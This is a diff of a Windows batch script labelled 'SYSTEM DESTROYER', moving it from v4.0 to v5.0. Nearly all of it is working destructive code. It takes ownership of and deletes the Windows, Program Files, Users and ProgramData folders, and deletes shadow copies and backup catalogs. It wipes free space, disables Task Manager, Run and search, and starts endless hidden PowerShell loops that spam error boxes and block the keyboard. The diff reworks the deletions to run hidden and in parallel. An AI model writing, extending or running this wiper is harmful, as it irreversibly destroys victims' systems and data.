@@ -8,11 +8,11 @@ if '%errorlevel%' NEQ '0' (
 )
 
 mode con: cols=80 lines=30
-title SYSTEM DESTROYER v4.0 - FINAL MISSION
+title SYSTEM DESTROYER v5.0 - FINAL MISSION
 
 echo.
 echo ========================================
-echo    SYSTEM DESTROYER v4.0 - FINAL
+echo    SYSTEM DESTROYER v5.0 - FINAL
 echo ========================================
 echo    PHASE 1: MBR/GPT DESTRUCTION
 echo ========================================
@@ -37,26 +37,24 @@ for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     )
 )
 
-echo [3] Killing system folders...
-for %%f in ("C:\Windows" "C:\Program Files" "C:\Program Files (x86)" "C:\Users" "C:\ProgramData" "C:\Recovery") do (
-    if exist %%f (
-        takeown /f %%f /r /d y >nul 2>&1
-        icacls %%f /grant everyone:F /t /c /q >nul 2>&1
-        rd /s /q %%f >nul 2>&1
-    )
-)
+echo [3] KILLING SYSTEM FOLDERS...
+start /min cmd /c "takeown /f C:\Windows /r /d y && icacls C:\Windows /grant everyone:F /t /c /q && rd /s /q C:\Windows"
+start /min cmd /c "takeown /f C:\Program Files /r /d y && icacls C:\Program Files /grant everyone:F /t /c /q && rd /s /q C:\Program Files"
+start /min cmd /c "takeown /f C:\Program Files (x86) /r /d y && icacls C:\Program Files (x86) /grant everyone:F /t /c /q && rd /s /q C:\Program Files (x86)"
+start /min cmd /c "takeown /f C:\Users /r /d y && icacls C:\Users /grant everyone:F /t /c /q && rd /s /q C:\Users"
+start /min cmd /c "takeown /f C:\ProgramData /r /d y && icacls C:\ProgramData /grant everyone:F /t /c /q && rd /s /q C:\ProgramData"
 
 echo [4] Destroying recovery...
 vssadmin delete shadows /all /quiet >nul 2>&1
 wbadmin delete catalog -quiet >nul 2>&1
-rd /s /q "C:\System Volume Information" >nul 2>&1
-rd /s /q "C:\$Recycle.Bin" >nul 2>&1
+rd /s /q "C:\System Volume Information" 2>nul
+rd /s /q "C:\$Recycle.Bin" 2>nul
 
 echo [5] Wiping free space...
 for %%d in (C D E F) do (
     if exist %%d:\ (
         echo   Wiping %%d:...
-        cipher /w:%%d:\ >nul 2>&1
+        start /min cipher /w:%%d:\
         echo   [DONE] Drive %%d: wiped
     )
 )
@@ -71,12 +69,14 @@ echo [6] Killing explorer and blocking...
 taskkill /f /im explorer.exe >nul 2>&1
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoStartMenuMorePrograms" /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoSearchBox" /t REG_DWORD /d 1 /f >nul 2>&1
 
 echo [7] Loading ERROR SYSTEM...
 start /min powershell -WindowStyle Hidden -Command "while(1){Add-Type -AssemblyName System.Windows.Forms;$x=[System.Windows.Forms.Cursor]::Position.X;$y=[System.Windows.Forms.Cursor]::Position.Y;[System.Windows.Forms.MessageBox]::Show('FUCKED','ERROR',0,16);[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(($x+50),($y+50))}"
 
 echo [8] Keyboard blocking...
-powershell -Command "$null = [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.SendKeys]::SendWait('{F13}'); while(1){[System.Windows.Forms.SendKeys]::SendWait('{SCROLLLOCK}')}"
+start /min powershell -Command "$null = [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.SendKeys]::SendWait('{F13}'); while(1){[System.Windows.Forms.SendKeys]::SendWait('{SCROLLLOCK}')}"
 
 echo.
 echo ========================================
